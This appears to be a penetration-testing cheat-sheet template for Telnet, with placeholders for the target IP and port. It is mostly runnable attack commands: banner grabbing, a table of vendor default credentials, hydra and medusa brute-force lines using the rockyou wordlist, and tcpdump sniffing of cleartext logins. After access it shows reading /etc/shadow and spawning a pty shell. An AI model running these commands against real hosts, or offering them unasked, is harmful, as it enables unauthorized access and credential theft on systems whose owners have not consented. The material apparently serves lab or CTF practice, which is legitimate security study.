# Telnet — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let port = tp.frontmatter.current_port || 23 -%>

---

## Nmap
```bash
nmap -p<% port %> --script=telnet-ntlm-info,telnet-encryption <% ip %>
```

---

## Banner Grab
```bash
nc -nv <% ip %> <% port %>
```

```bash
telnet <% ip %> <% port %>
```

```bash
curl telnet://<% ip %>:<% port %>
```

---

## Connect
```bash
telnet <% ip %> <% port %>
```

> [!tip] Once connected, try common default credentials (see below). All traffic is cleartext — sniff with Wireshark on tun0 if possible.

---

## Default Credentials to Try

| Vendor / Device | Username | Password |
|-----------------|----------|----------|
| Router / generic | admin | admin |
| Router / generic | admin | password |
| Router / generic | admin | (blank) |
| Router / generic | root | root |
| Cisco IOS | (blank) | (blank) |
| Cisco IOS | cisco | cisco |
| Cisco | admin | cisco |
| HP Switches | admin | admin |
| 3Com | admin | admin |
| Unix / Linux | root | root |
| Unix / Linux | root | (blank) |
| QNAP NAS | admin | admin |
| MikroTik | admin | (blank) |

```bash
# Try blank password
telnet <% ip %> <% port %>
# username: admin
# password: (enter)
```

---

## Brute Force
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt telnet://<% ip %> -s <% port %> -t 1 -V
```

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt telnet://<% ip %> -s <% port %> -t 1
```

```bash
medusa -h <% ip %> -u root -P /usr/share/wordlists/rockyou.txt -M telnet -n <% port %> -t 1
```

> [!warning] Telnet brute force is slow (synchronous protocol) — use `-t 1` to avoid connection errors.

---

## Sniff Credentials (if on same network)
```bash
sudo tcpdump -i tun0 -A port <% port %> and host <% ip %>
```

---

## What to Do Once Connected

```bash
# System enumeration
whoami
id
uname -a
cat /etc/passwd
cat /etc/shadow  # if root
ls -la /root
env
ps aux
netstat -tulnp
```

```bash
# Spawn better shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Notes
